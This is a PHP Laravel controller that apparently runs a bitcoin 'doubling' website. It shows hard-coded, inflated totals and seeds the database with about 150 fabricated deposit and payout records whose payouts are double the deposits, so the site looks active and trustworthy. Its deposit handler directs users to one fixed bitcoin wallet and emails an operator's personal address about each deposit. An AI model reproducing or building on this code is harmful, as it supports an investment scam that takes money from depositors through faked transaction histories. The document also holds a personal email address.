<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use App\Deposits;
use App\Payouts;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
    	$totalDeposit = "12449.1245786542";
        $totalPayout = "104641.54678413";
        $totalPayoutTransactions = "2045137";
        $totalDepositAccounts = "226312";
    	$latestDeposits = $this->helpers->getDeposits();
        $latestPayouts = $this->helpers->getPayouts();
        
    	return view('index', compact(['latestDeposits', 'latestPayouts','totalDepositAccounts', 'totalPayoutTransactions', 'totalDeposit', 'totalPayout']));
    }
    
    
    public function postDouble(Request $request)
	{
           $req = $request->all();
          # dd($req);
               
                $validator = Validator::make($req, [
                             'amount' => 'required|numeric',
                             'wallet_address' => 'required'
                   ]);
         
                 if($validator->fails())
                  {
                       $messages = $validator->messages();
                      //dd($messages);
             
                      return redirect()->back()->withInput()->with('errors',$messages);
                 }
                
                 else
                 { 
                     $wallet = "1NnqMhCiss4AChv7WJ9qR4dfJrPY6tUcRE";              	
                     $arr = ['amount' => $req['amount'], 'wallet' => $req['wallet_address'], 'status' => "pending"];
                     $this->helpers->addDeposit($arr);
                     
                 	$this->helpers->sendEmail("kudayisitobi@gmail.com" ,"Client Just Deposited Bitcoin",['arr' => $arr],'emails.deposit_alert','view');
                     Session::flash("deposit-status", "success");
                     Session::flash("amount", $req['amount']);
                     Session::flash("wallet", $wallet);
                     return redirect()->intended('/');                           
                 }
                                       
	}
	
	
	public function getSeed()
    {
$text =
<<<EOT
Deposit,2017-12-22 19:59:07,1A9WRwN3qZiAUB9NPnvYArrBrmEvwZL3wZ,0.0447 ,02:51:46,0.0894 
Deposit,2017-12-22 19:58:47,1Bm9qSdTgtArY59KRbg3Mn3bFD1ZAr1eP,0.0400 ,02:51:26,0.08 
Deposit,2017-12-22 19:58:17,1LrC39gFo5ssx2q6gFSEjQ4bHWEGemXcbZ,0.0120 ,02:50:56,0.024 
Payout,2017-12-22 19:57:49,1Py1UyHRuG8mXbPVHeqpUSeeEYcgXCxo5S,0.1857 ,00:00:00,0.3714 
Deposit,2017-12-22 19:57:17,1wrdpnLcpbQ92WoCZjqro9uwpq7Mfgc2s,0.0100 ,02:49:57,0.02 
Deposit,2017-12-22 19:56:58,1F4JTAYwjwF133UQFyNsKYqwmTsz88Jzcx,0.0248 ,02:49:37,0.0496 
Deposit,2017-12-22 19:56:47,1GYsZrwMNhWLaKhjCVZffAyKWz5R8NaW16,0.1084 ,02:49:27,0.2168 
Deposit,2017-12-22 19:56:27,17XDgQapuvCVARCq3PL1gTETmuSR4MvxJX,0.2636 ,02:49:07,0.5272 
Deposit,2017-12-22 19:56:18,193VTPb5DK4EwE9c26nQxSq7UUtDmBVf2k,0.0100 ,02:48:58,0.02 
Deposit,2017-12-22 19:55:28,13bafKjZ3qmnMBHrJoLXtXqtswWysJCHHH,0.0191 ,02:48:10,0.0382 
Deposit,2017-12-22 19:55:18,13VWtVdbCfFunU7WsE7JmbmLJLvLZwEtbF,0.0699 ,02:47:58,0.1398 
Deposit,2017-12-22 19:55:08,1CT6U2S36dvPFf8xuLXPofMwux7FP557cS,0.1146 ,02:47:48,0.2292 
Deposit,2017-12-22 19:54:58,14hs86rqRepn87Kt9ZiCtYMonvWBokJ81s,0.1113 ,02:47:38,0.2226 
Deposit,2017-12-22 19:54:48,1MCYZgZhhfq1iRzbMMEqKdsySdsFVKHKnm,0.0100 ,02:47:27,0.02 
Deposit,2017-12-22 19:54:29,182W8c13YAV7aLpo7xCXrSMs2oMZn6mXRv,0.0242 ,02:47:10,0.0484 
Deposit,2017-12-22 19:54:17,1PM79ftUzyAQyavLxoN19hLwv5nydyjqNV,0.0188 ,02:46:56,0.0376 
Deposit,2017-12-22 19:54:07,1B1PvujpDhzSLQfEbu6PZkxxF5dErzhK9x,0.0303 ,02:46:47,0.0606 
Deposit,2017-12-22 19:53:39,1GimxPyogibyeTAmUF4BrX6paDtBzb3taD,0.0127 ,02:46:18,0.0254 
Deposit,2017-12-22 19:52:10,1Dw3fhdMhHnx2NGcoNyUoRhuZn6KApFwJ4,0.0114 ,02:44:49,0.0228 
Deposit,2017-12-22 19:51:00,1DRK61hhX1jXtAPPjveCMtARNcT61nSXkB,0.0525 ,02:43:39,0.105 
Deposit,2017-12-22 19:50:39,17LbvKgY28qpv7asCKSRhYaJnUwpKszNFx,0.0154 ,02:43:19,0.0308 
Deposit,2017-12-22 19:50:28,14cViRYMCVDNDYagfLQ44rw5FainP2DCEJ,0.0144 ,02:43:07,0.0288 
Deposit,2017-12-22 19:50:06,1NWHusP7WCkRrg9m5h16g3FRr65tJX889x,0.0602 ,02:42:46,0.1204 
Deposit,2017-12-22 19:50:02,18EeDrp7WDQur4BsBiuwBC9BoGi14wXEgj,0.1111 ,02:42:41,0.2222 
Payout,2017-12-22 19:49:48,1BYitY4Ra7SMaofFwRKrDHDX51XXG4EMu3,0.1663 ,00:00:00,0.3326 
Payout,2017-12-22 19:49:37,1Mqeg3JbBEZyPScN7tQ5jjt1qVZ9qEdpvw,0.4177 ,00:00:00,0.8354 
Deposit,2017-12-22 19:49:30,15rShUsLjqzgBvNvaPBhkdM7MVXTH4SXFa,0.0866 ,02:42:10,0.1732 
Deposit,2017-12-22 19:49:09,18cSXBrE3EjWRYXbi5umypp16ZdmQAifri,0.0158 ,02:41:48,0.0316 
Deposit,2017-12-22 19:47:33,19bHzR5xVhXkw4f1tXwu9ecfKE4o3sNqa1,0.0637 ,02:40:57,0.1274 
Deposit,2017-12-22 19:47:23,15WrMyCHVEktcfuenDUrv2iuozxcuXqqb4,0.0475 ,02:40:47,0.095 
Deposit,2017-12-22 19:47:13,1BhqTBAUhqvPZ85NnFzopkUdcQTcsgGLGV,0.0750 ,02:40:37,0.15 
Deposit,2017-12-22 19:46:53,15iDUiZwaUdjH3zVynHniFkWBGrDhnPanx,0.0105 ,02:40:17,0.021 
Deposit,2017-12-22 19:46:15,3LSK1guCXTPi7KhDRryyxUfTq3Dr1ivJmc,0.0280 ,02:39:38,0.056 
Deposit,2017-12-22 19:45:54,3G8qqMuizeVqgZvGT8gfHQfP7CUfFSypbJ,0.2154 ,02:39:18,0.4308 
Deposit,2017-12-22 19:45:43,3G8qqMuizeVqgZvGT8gfHQfP7CUfFSypbJ,0.2222 ,02:39:07,0.4444 
Deposit,2017-12-22 19:45:34,3CZxJaGPanLuv8SHku78gfycRRnywYAXxR,0.0497 ,02:38:58,0.0994 
Deposit,2017-12-22 19:45:23,3CRaJaLiP1HVzTttq7hhNivqGBHBvpQSVM,0.0687 ,02:38:46,0.1374 
Deposit,2017-12-22 19:44:43,1MdMuM8jgy6rEu6yqdnjUCVdcJNfaDwWyB,0.1000 ,02:38:07,0.2 
Deposit,2017-12-22 19:44:35,146xMArJjFBHThnAYgKbFR7AB6ey5Jz7hF,0.1000 ,02:37:59,0.2 
Deposit,2017-12-22 19:44:23,1B3zfhwcMgtEKhnJ7fRgaAszDH9P78VJtS,0.2010 ,02:37:47,0.402 
Deposit,2017-12-22 19:44:13,18WWgbFq5B75Y75i2KMEVvrS9XgVfCiwPo,0.0983 ,02:37:37,0.1966 
Deposit,2017-12-22 19:44:06,14qrAYVassFkwMXeaWa8QV8hQ73gfFrLvL,0.0739 ,02:37:29,0.1478 
Deposit,2017-12-22 19:43:23,1Ks4EbJUsVzhmjXYnGEk8G1t9Mr2dxnxsg,0.1992 ,02:36:47,0.3984 
Deposit,2017-12-22 19:42:59,1AVZxezXJuVWSgKzNksDXor8WzYMvGfabF,0.0200 ,02:36:23,0.04 
Deposit,2017-12-22 19:42:33,1HzbQBCczhorCKyYvvwvFb6HVH9viMng2M,0.2678 ,02:35:57,0.5356 
Deposit,2017-12-22 19:41:44,12CddDShk6nuWkLQLkPUTguYeCa7VQV5TB,0.0122 ,02:35:08,0.0244 
Deposit,2017-12-22 19:41:33,1DAumWgFakdbhp6giS97v3qDYNNAyFppj5,0.0120 ,02:34:57,0.024 
Deposit,2017-12-22 19:41:03,1C1oXrDSYgLBiCGdn9YgpxnoKTfjkoXfVa,0.0325 ,02:34:26,0.065 
Deposit,2017-12-22 19:40:55,19uarkzYHVgzQMgYzT919zCYBPci4FgKUo,0.0685 ,02:34:19,0.137 
Deposit,2017-12-22 19:40:43,1c9WF6cPprQPNyLsk5XcHTDHR6T6ekSrg,0.0144 ,02:34:07,0.0288 
Deposit,2017-12-22 19:40:35,1F3Xx1ZmHG76BTeCipNXrRahpj2X12eayY,0.0126 ,02:33:59,0.0252 
Deposit,2017-12-22 19:40:23,1Jz6BhjoEpujmmnAYQsRdVw3HZDsCzocM1,0.0138 ,02:33:47,0.0276 
Deposit,2017-12-22 19:40:13,13NingDnGk4YHP4rihpTgmvS5oHSS9PreZ,0.2119 ,02:33:36,0.4238 
Payout,2017-12-22 19:40:03,13NingDnGk4YHP4rihpTgmvS5oHSS9PreZ,0.24085 ,00:00:00,0.4817 
Deposit,2017-12-22 19:39:53,1N7uMwmLgZ11wBJUpkL9vW1YAF4LjhNupp,0.0100 ,02:33:16,0.02 
Payout,2017-12-22 19:39:45,12mHynUFSopARttGoXJyzpxBRJj7RQDtpT,0.2533 ,00:00:00,0.5066 
Deposit,2017-12-22 19:39:33,1KhYSpFJZadKk4ZVFvWKNBiMwioyFLSaTM,0.0497 ,02:32:57,0.0994 
Deposit,2017-12-22 19:39:24,14jjjoNQcx2dQJpv23MYqr6X16nfBiuNau,0.0133 ,02:32:48,0.0266 
Deposit,2017-12-22 19:39:13,16wKs1CZo8odqqHdJ8UCQSmSaDKwyE9uPi,0.0200 ,02:32:36,0.04 
Deposit,2017-12-22 19:38:53,1J5P9XYQxfsPwoK8quF5SmpeuF9hubn676,0.0347 ,02:32:17,0.0694 
Payout,2017-12-22 19:38:32,1Es4oVLDhJmiwFL9CVb4t55GGnfMJ2QR3N,0.03105 ,00:00:00,0.0621 
Deposit,2017-12-22 19:38:04,1FCxMfwoXNtZeKziVpfx1RJNhTH5azgtqW,0.0637 ,02:31:28,0.1274 
Deposit,2017-12-22 19:37:06,1Ma61bdeVhgUPKF1QqwF5GczCVvQ16Ks2u,0.0123 ,02:30:30,0.0246 
Payout,2017-12-22 19:36:23,1MLKHwzT9yihWcwJgSMPJe559EqNDDCzZQ,0.2547 ,00:00:00,0.5094 
Deposit,2017-12-22 19:36:13,1Pb6CatdSqvvQTZaUKCLL8wUj5uR4JiTMg,0.0168 ,02:29:36,0.0336 
Deposit,2017-12-22 19:36:03,1oXKYy5AYCUUzpbcTKfpk8Ed8kjbPL3Vb,0.0270 ,02:29:26,0.054 
Deposit,2017-12-22 19:35:56,19eAJ9xSRmNXYNvFPfXCntWWqddssYERz9,0.0602 ,02:29:20,0.1204 
Payout,2017-12-22 19:35:35,1Ar7xoCCrnD8XuMwpJQwjWBFTL9Tsetf64,0.2665 ,00:00:00,0.5330 
Deposit,2017-12-22 19:35:23,19GWekUifzSX29dYkU37qUK8hP4Q3zw4uC,0.1406 ,02:28:46,0.2812 
Deposit,2017-12-22 19:34:43,3QS9xPKKhWoa92vbNDhuDLPxNKLgzMSRVS,0.1798 ,02:28:06,0.3596 
Deposit,2017-12-22 19:34:13,33MSgwqVtyWQWo4yJ3P9raE8Jtf7qvAiw9,0.0390 ,02:27:36,0.078 
Deposit,2017-12-22 19:34:04,3PaqErfnU6HxZ4V7JVMGQxxVnezxKzd6s8,0.0144 ,02:27:28,0.0288 
Deposit,2017-12-22 19:33:53,1CsD36ZAVEgSEhGJkFdxGCSA5pXYAmAigp,0.0392 ,02:27:17,0.0784 
Deposit,2017-12-22 19:33:45,18SidzmQU8w4HGxEke4vQFNYt44wD84z8H,0.0227 ,02:27:09,0.0454 
Deposit,2017-12-22 19:33:33,3Ju5n9c3E514CEEQNJXJjWH1Bcz4AGWZuT,0.0111 ,02:26:56,0.0222 
Deposit,2017-12-22 19:33:25,1AJNDjGxXcPzuiKR9MA4T4v7SDdKtyVc1Z,0.0176 ,02:26:49,0.0352 
Deposit,2017-12-22 19:33:03,1KQkx6UT33p3MfSrT9Re86odsGmW3w4mgd,0.0144 ,02:26:26,0.0288 
Payout,2017-12-22 19:32:43,1Eyg1xaYcJMafvgfqJZAiKrPeLDwbsT3RZ,0.2537 ,00:00:00,0.5074 
Payout,2017-12-22 19:32:23,1MhwaL53ouZUA1E36fFW9bprS8EHgnaaNb,0.16375 ,00:00:00,0.3275 
Deposit,2017-12-22 19:32:14,32FnTnGV8jZoipp4LiPpapprw9FDXiki56,0.0758 ,02:25:38,0.1516 
Deposit,2017-12-22 19:31:57,1EUgU5UrL5W1VGBcw3KqeSGciRGicZARtr,0.0100 ,02:25:21,0.02 
Deposit,2017-12-22 19:31:43,701a8d401c84fb13e6baf169d59684e17abd9fa216c8cc5b9fc63d622ff8c58d,0.0140 ,02:25:06,0.028 
Deposit,2017-12-22 19:31:34,1Fox2SqvNocGhXAySavMcrUWNNt6BnrWtf,0.0136 ,02:24:58,0.0272 
Deposit,2017-12-22 19:31:14,1BzEiAeFmNH54vK5kyFJGFxgDTnmwmt5JQ,0.2510 ,02:24:38,0.502 
Deposit,2017-12-22 19:31:03,1AVd42A8gzuBLGXZL2ZfFyLJXS3w5tfpaC,0.2130 ,02:24:27,0.426 
Payout,2017-12-22 19:30:54,1DtYSazweasqZQCzakLxA7GD1G9XX5dDnM,0.21295 ,00:00:00,0.4259 
Deposit,2017-12-22 19:30:45,13MY2mqjLBshP6yKoZYPhgyPz3Uv42ZhSA,0.0151 ,02:24:08,0.0302 
Payout,2017-12-22 19:30:24,18dt5LTUCjTwgzgxcxxSoMnLBD8MFfCU6S,0.2008 ,00:00:00,0.4016 
Deposit,2017-12-22 19:30:13,1JPE3mEqQR25RhiZHDpbr1BSLrQKR6cd9j,0.2667 ,02:23:36,0.5334 
Deposit,2017-12-22 19:30:03,1QB6KX2aMGyFWE1FgNdT1KTZjU1cYHb4iS,0.1450 ,02:23:27,0.29 
Deposit,2017-12-22 19:29:43,1pUXaZNSHRFWA93dczYSyefSK2Cv6jEcb,0.0323 ,02:23:07,0.0646 
Deposit,2017-12-22 19:29:33,1QAw9KmaYBi9yDZ7qZwTqaMQYiw3AeYyEy,0.0982 ,02:22:56,0.1964 
Deposit,2017-12-22 19:29:24,1GR7hbiDV993HrRi71Mv57Ru7MzuG3AA6B,0.1641 ,02:22:48,0.3282 
Deposit,2017-12-22 19:29:13,1F8hkcojMd69mtSmtRE4KTe9EDqFRxnwXD,0.0232 ,02:22:36,0.0464 
Deposit,2017-12-22 19:28:53,1EkqvuAZadX73HQvMwLTDvg4tuKKiFu8H5,0.0254 ,02:22:17,0.0508 
Deposit,2017-12-22 19:28:44,17dUCgyUMdvKfY95fikHxN1x1YQvXYV74s,0.0125 ,02:22:08,0.025 
Deposit,2017-12-22 19:28:33,3HyiLaw3pQzq8B3Y65wmoaUbeNHBZ8GKQT,0.0110 ,02:21:56,0.022 
Deposit,2017-12-22 19:28:23,1H5AMnzWnDWJ4JQRfUC7JumNS86xBmpWuQ,0.0462 ,02:21:46,0.0924 
Payout,2017-12-22 19:28:13,143oDCkZHgrSRTkfEVBEhLdGC5ReTGZ7cK,0.0622 ,00:00:00,0.1244 
Deposit,2017-12-22 19:28:05,1NkYKwvqkTiKUnzM6wPbHTHVuWec8YPeHR,0.1375 ,02:21:28,0.275 
Deposit,2017-12-22 19:27:53,14GrCWhMTqsyyybe9fxSmguoVvUSycS8hF,0.1840 ,02:21:16,0.368 
Deposit,2017-12-22 19:27:44,18snyG1piszWpUgneJtLmpRWigLgDR6CRV,0.0111 ,02:21:08,0.0222 
Deposit,2017-12-22 19:27:33,1GrKNt8B3cYFQ97WeoeBWem6jkDju3s3H2,0.1292 ,02:20:57,0.2584 
Deposit,2017-12-22 19:27:14,15kCaxaiQotFByp7bbMDWadXYaMqzcZpgQ,0.0100 ,02:20:38,0.02 
Deposit,2017-12-22 19:27:03,1NrtFNyapu1ioAz34SDGrKVAswNzhfeHFs,0.0518 ,02:20:26,0.1036 
Deposit,2017-12-22 19:26:15,13pGK7uvF1nmAbGcf1LpnwvsaUVHXHCyg3,0.0579 ,02:19:38,0.1158 
Deposit,2017-12-22 19:25:53,1D6PXmhedMDcxQv2H3RTKWiyt4h2vdfZux,0.1067 ,02:19:17,0.2134 
Deposit,2017-12-22 19:25:33,1NSaKsWqJUZm5T7vNWK3LNHc4jswcMq2DX,0.0821 ,02:18:56,0.1642 
Deposit,2017-12-22 19:25:24,37PotfzDvkB3KEKNPuQDkmjQ3wCNB63ACu,0.0482 ,02:18:48,0.0964 
Payout,2017-12-22 19:24:32,1F4MZGQNDnAMmq1tERQZsGi5EiRxSEWVf5,0.09215 ,00:00:00,0.1843 
Payout,2017-12-22 19:24:20,1F4MZGQNDnAMmq1tERQZsGi5EiRxSEWVf5,0.10135 ,00:00:00,0.2027 
Payout,2017-12-22 19:24:08,19rwp2tqY5RYyXJPbDBnCVB7AbstQdBnK9,0.15005 ,00:00:00,0.3001 
Deposit,2017-12-22 19:23:44,1LTHVbfc2SqRAvLNLZ23f7PFemruakc7XK,0.0103 ,02:17:15,0.0206 
Payout,2017-12-22 19:23:32,15HQooMvRqe9rwiuFffqg8Shz8HE6KeyHS,0.1601 ,00:00:00,0.3202 
Deposit,2017-12-22 19:23:20,17gpvEyy3FiJaJDkUnmX6S4fupEcmFhrM5,0.0557 ,02:16:51,0.1114 
Deposit,2017-12-22 19:22:44,1FB8Kr8pRXPtfnWVZki4QW6kS7REMBVwU4,0.0104 ,02:16:15,0.0208 
Deposit,2017-12-22 19:21:56,18p9Ftp3m4435tdpZTvoBsm3yjUgkvTF2b,0.2032 ,02:15:27,0.4064 
Deposit,2017-12-22 19:21:44,13S35cEdMAFpVr8N3GrzTPHCm2Xp7MhE4v,0.1352 ,02:15:15,0.2704 
Deposit,2017-12-22 19:21:32,3C9aszwER7Q4uHoURi5phYoagUpyo583ty,0.0304 ,02:15:03,0.0608 
Payout,2017-12-22 19:21:20,1NCKmzsjjtDb4UHkQJYAp1kgVCqnYvBWiE,0.4162 ,00:00:00,0.8324 
Deposit,2017-12-22 19:21:08,1M7VQ2bwJxYEWDkNgBxSnpkE8UdsksHePe,0.0104 ,02:14:39,0.0208 
Payout,2017-12-22 19:20:56,1HKMB1zUjFQrPbdW2yfhZ4HREdGV96s9gP,0.0151 ,00:00:00,0.0302 
Payout,2017-12-22 19:20:32,701a8d401c84fb13e6baf169d59684e17abd9fa216c8cc5b9fc63d622ff8c58d,0.36455 ,00:00:00,0.7291 
Deposit,2017-12-22 19:20:08,1JBoHLXja8EsKDDambHe3LYvScQFNLRaH1,0.0300 ,02:13:39,0.06 
Deposit,2017-12-22 19:19:56,1EUAYeJYHHgLhFawLYJfeaegzutAz7dZA7,0.0446 ,02:13:27,0.0892 
Deposit,2017-12-22 19:19:44,15rFaWXPq7VsyHZw5h5nEwDnawpRqPGjqJ,0.0150 ,02:13:15,0.03 
Payout,2017-12-22 19:19:32,3LtegMAXjxo6Vkyh6WzTnfMmN8vh5VnU5f,0.02035 ,00:00:00,0.0407 
Payout,2017-12-22 19:19:20,1Ccb4vrC5atJHHdj3hHhYwJmYxtVZLZXWc,0.023 ,00:00:00,0.0460 
Payout,2017-12-22 19:19:08,1Ccb4vrC5atJHHdj3hHhYwJmYxtVZLZXWc,0.0517 ,00:00:00,0.1034 
Deposit,2017-12-22 19:18:56,3AoFTdjS2s5e79GMqAoL9ZJszrugMTczvs,0.0150 ,02:12:27,0.03 
Payout,2017-12-22 19:18:32,1MdnKVMTrttuf4kSCyPkGPLua8BKrnMCah,0.01065 ,00:00:00,0.0213 
Deposit,2017-12-22 19:18:20,3BEgFjGmsmqhkSm2NtvD94MgyK3ozaA4FJ,0.0358 ,02:11:51,0.0716 
Payout,2017-12-22 19:18:08,1LwAtWGG1kkpw11kbrqxBpPzUXxJTuYG8L,0.04895 ,00:00:00,0.0979 
Deposit,2017-12-22 19:17:32,1GBpiGs95Zvu6T622rx6V26bapcW5FCuPF,0.0813 ,02:11:03,0.1626 
Deposit,2017-12-22 19:17:20,1J37CY8hcdUXQ1KfBhMCsUVafa8XjDsdCn,0.1206 ,02:10:51,0.2412 
Deposit,2017-12-22 19:17:08,123ugeUGeDpG6a286ByrVQ98vNi13UFfvW,0.0413 ,02:10:39,0.0826 
Deposit,2017-12-22 19:16:56,1GtseuCnhiTKpD3CEZ6dzzHJ7QSt2LiJGF,0.0145 ,02:10:27,0.029 
Deposit,2017-12-22 19:16:44,3CyfMMRNKedfKicYPpUXZfrF5FatjrpEk2,0.0550 ,02:10:15,0.11 
Deposit,2017-12-22 19:16:32,39L7ziL4J1uXdzikEgNEEHZ19tkZKU7xoH,0.0380 ,02:10:03,0.076 
Deposit,2017-12-22 19:16:20,3MMXVimAk5ucqpbYxmEjL1nGTSeyUc5VVN,0.0217 ,02:09:51,0.0434 
Deposit,2017-12-22 19:16:08,328CGR28H3A9JTAA1pMNT9FW7njdr8p8cz,0.2313 ,02:09:39,0.4626 
Deposit,2017-12-22 19:15:56,1Gw7Wx89Q1fkCy62R264xkaCuwptftn7ZG,0.0320 ,02:09:27,0.064 
Deposit,2017-12-22 19:15:44,1A66ApKsAQhe1f5mUXfpcAHfn9cG9oYsRX,0.0190 ,02:09:15,0.038 
Payout,2017-12-22 19:15:32,18CdvGPsp11wyttZdJZ6ZCAFpvRu5m7nUc,0.19055 ,00:00:00,0.3811 
Deposit,2017-12-22 19:15:20,34jKwsYrg1tPYDaSLfHJAvLYEey5AsqqVo,0.0194 ,02:08:51,0.0388 
Deposit,2017-12-22 19:15:08,3DQcUE7VvAfN5su9jf1gi9i5qat2EoMk3p,0.2142 ,02:08:39,0.4284 
Deposit,2017-12-22 19:14:56,1B7PosTv8mXN9W8peHW53hNYNTvptRSQYY,0.2215 
EOT;

$mainArr = explode("\n", $text);

#echo "main arr has ".count($mainArr)." elements in it";
$txt = "";

for($i = 0; $i < count($mainArr); $i++)
{
    $temp = explode(",", $mainArr[$i]);
    $txt .= "Type:".$temp[0].", timestamp: ".$temp[1].", address: ".$temp[2];
    if($temp[0] == "Deposit")
    {
    	$txt .= ", amount: &#x0E3F;".$temp[3];
        $status = "active"; if($i % 5 == 0) $status = "pending";
        $arr = ['amount' => $temp[3], 'wallet' =>$temp[2], 'status' => $status, 'date' => $temp[1] ];
        $this->helpers->addDeposit($arr);
    } 
    
    else if($temp[0] == "Payout")
    {
    	$txt .= ", amount: &#x0E3F;".$temp[5];
        $arr = ['amount' => $temp[5], 'wallet' =>$temp[2], 'status' => "pending", 'date' => $temp[1] ];
        $this->helpers->addPayout($arr);
    } 
    
    $txt .=  "<br><br>";
    
    
}

#echo $txt;
        
    	return redirect()->intended('/');                           
    }

}
